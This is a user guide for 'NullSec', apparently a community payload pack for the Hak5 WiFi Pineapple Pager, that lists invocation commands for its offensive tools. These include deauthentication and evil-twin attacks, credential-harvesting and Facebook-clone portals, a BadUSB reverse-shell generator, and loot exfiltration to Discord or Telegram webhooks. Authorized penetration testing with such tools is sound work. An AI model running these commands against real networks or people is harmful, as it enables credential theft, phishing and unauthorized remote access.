# NullSec Firmware - User Guide

## Quick Start Guide

### Prerequisites
- Hak5 WiFi Pineapple Pager device
- SD card (recommended: 8GB+)
- Computer with SSH capability

### Installation Methods

#### Method 1: Desktop Updater (Recommended)
1. Download `nullsec-updater` for your platform
2. Connect to your Pineapple Pager's WiFi AP
3. Launch the updater application
4. Enter device password and click "Install"

#### Method 2: Manual SSH Installation
```bash
# Connect to Pager WiFi
nmcli device wifi connect "YOUR_PAGER_SSID" password "YOUR_PASSWORD"

# SSH to device
ssh root@172.16.52.1

# Download and run installer
curl -L https://github.com/nullsec/pager-firmware/releases/latest/download/install.sh | bash
```

#### Method 3: Manual File Copy
```bash
# Extract firmware package
tar -xzf nullsec-pager-firmware-vX.X.tar.gz

# Copy to device
scp -r nullsec-firmware/* root@172.16.52.1:/tmp/

# SSH and run installer
ssh root@172.16.52.1 "cd /tmp && ./install.sh"
```

---

## Payload Documentation

### Attack Payloads

#### nullsec-autopwn.sh
**Full automated attack chain**
- Reconnaissance → PMKID capture → Handshake capture → Karma attack
- Generates comprehensive report

Usage:
```bash
./nullsec-autopwn.sh              # Interactive mode
./nullsec-autopwn.sh --full       # Full auto attack
./nullsec-autopwn.sh --target XX:XX:XX:XX:XX:XX  # Target specific AP
```

#### nullsec-karma.sh
**Evil twin with captive portal**
- Creates fake AP matching target
- Captures credentials via portal

Usage:
```bash
./nullsec-karma.sh --ssid "Target_Network"
./nullsec-karma.sh --clone XX:XX:XX:XX:XX:XX
```

#### nullsec-deauth.sh
**Mass deauthentication attacks**
- Targeted client deauth
- Mass deauth for handshake capture

Usage:
```bash
./nullsec-deauth.sh --target XX:XX:XX:XX:XX:XX --client YY:YY:YY:YY:YY:YY
./nullsec-deauth.sh --broadcast --bssid XX:XX:XX:XX:XX:XX
```

#### nullsec-pmkid.sh
**PMKID hash capture**
- Clientless WPA2 attack
- Outputs hashcat 22000 format

Usage:
```bash
./nullsec-pmkid.sh --target XX:XX:XX:XX:XX:XX
./nullsec-pmkid.sh --all --duration 300
```

#### cred-harvest.sh
**Multi-protocol credential capture**
- Captive portal
- HTTP Basic Auth
- FTP/SMTP/Telnet capture
- LLMNR/NBT-NS poisoning

Usage:
```bash
./cred-harvest.sh --portal "Free_WiFi"
./cred-harvest.sh --full
./cred-harvest.sh --poison
```

#### usb-arsenal.sh
**BadUSB payload generator**
- Windows/macOS/Linux payloads
- Reverse shells
- WiFi exfiltration
- Credential dumps

Usage:
```bash
./usb-arsenal.sh --win-revshell 192.168.1.100 4444
./usb-arsenal.sh --win-wifi
./usb-arsenal.sh --library
```

### Reconnaissance Payloads

#### wifi-audit.sh
**Comprehensive WiFi security audit**
- Network discovery
- Client enumeration
- Hidden SSID detection
- WPS vulnerability check
- Security assessment report

Usage:
```bash
./wifi-audit.sh --full            # Full audit
./wifi-audit.sh --quick           # Quick scan
./wifi-audit.sh --security        # Security report only
```

#### network-mapper.sh
**Network topology discovery**
- Ping sweep
- ARP scan
- Port scanning
- Service identification
- OS fingerprinting

Usage:
```bash
./network-mapper.sh --full
./network-mapper.sh --sweep
./network-mapper.sh --port 192.168.1.1
```

#### sigint.sh
**Signal Intelligence - Passive reconnaissance**
- Probe request capture
- Access point enumeration
- Client device tracking
- Signal strength monitoring
- Vendor identification

Usage:
```bash
./sigint.sh quick             # 60-second scan
./sigint.sh full 300          # 5-minute full scan
./sigint.sh stealth           # Low-profile passive mode
./sigint.sh target AA:BB:CC:DD:EE:FF  # Track specific device
./sigint.sh probes            # Capture probe requests only
```

#### evil-portal.sh
**Evil Portal Toolkit**
- WiFi captive portal generator
- Social media login clones
- Credential capture and logging
- Multiple templates included

Usage:
```bash
./evil-portal.sh create wifi CoffeeShop_Guest   # Create WiFi portal
./evil-portal.sh create social facebook         # Create social portal
./evil-portal.sh generate-all                   # Generate all templates
./evil-portal.sh deploy facebook_login          # Deploy portal
./evil-portal.sh loot                           # View captured creds
```

#### nullsec-probes.sh
**Probe request harvesting**
- Capture device probe requests
- Build SSID pool from probes
- Track devices over time

Usage:
```bash
./nullsec-probes.sh --capture 600
./nullsec-probes.sh --track XX:XX:XX:XX:XX:XX
```

### Utility Payloads

#### nullsec-sync.sh
**Loot backup and exfiltration**
- SSH backup
- Discord webhook
- Telegram bot
- USB backup

Usage:
```bash
./nullsec-sync.sh --ssh user@server:/backup
./nullsec-sync.sh --discord "WEBHOOK_URL"
./nullsec-sync.sh --usb /dev/sda1
```

---

## Quick Commands

After installation, these commands are available system-wide:

| Command | Description |
|---------|-------------|
| `nullscan` | Quick WiFi network scan |
| `nullstatus` | System status overview |
| `nulloot` | View captured loot |

---

## File Locations

| Path | Contents |
|------|----------|
| `/root/payloads/nullsec/` | All NullSec payloads |
| `/mmc/root/themes/nullsec/` | NullSec theme files |
| `/mmc/nullsec/handshakes/` | Captured handshakes |
| `/mmc/nullsec/pmkid/` | PMKID hashes |
| `/mmc/nullsec/creds/` | Captured credentials |
| `/mmc/nullsec/probes/` | Probe request logs |
| `/mmc/nullsec/reports/` | Generated reports |

---

## Theme Customization

### Activating NullSec Theme
1. On device: Settings → Display → Theme → nullsec
2. Or via SSH:
```bash
uci set system.@pager[0].theme_name='nullsec'
uci set system.@pager[0].theme_path='/root/themes/nullsec'
uci commit system
```

### Custom Colors
Edit `/mmc/root/themes/nullsec/theme.json` to customize:
- `nullsec_red` - Primary red (#C80000)
- `nullsec_glow` - Accent red (#FF3232)
- `nullsec_dark` - Background (#0F0F0F)
- `matrix_green` - Hacker green (#00FF41)

---

## Troubleshooting

### Theme not loading
```bash
# Reset to default theme
uci set system.@pager[0].theme_name='wargames'
uci set system.@pager[0].theme_path='/root/themes/wargames'
uci commit system
reboot
```

### Payloads not executing
```bash
# Ensure executable permissions
chmod +x /root/payloads/nullsec/**/*.sh
```

### SD card issues
```bash
# Check SD card mount
df -h /mmc
# Remount if needed
mount -o remount,rw /mmc
```

---

## Credits

- **Built for Hak5 WiFi Pineapple** - https://hak5.org
- WiFi Pineapple® is a registered trademark of Hak5 LLC
- This is an independent community contribution

---

## Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This firmware and its payloads are intended for use by security professionals conducting authorized penetration testing. Unauthorized access to computer systems is illegal.

Users are solely responsible for ensuring compliance with all applicable laws and obtaining proper authorization before use.

---

<p align="center">
  <b>NullSec Security Tools</b><br>
  <i>Powered by Hak5 Hardware</i>
</p>
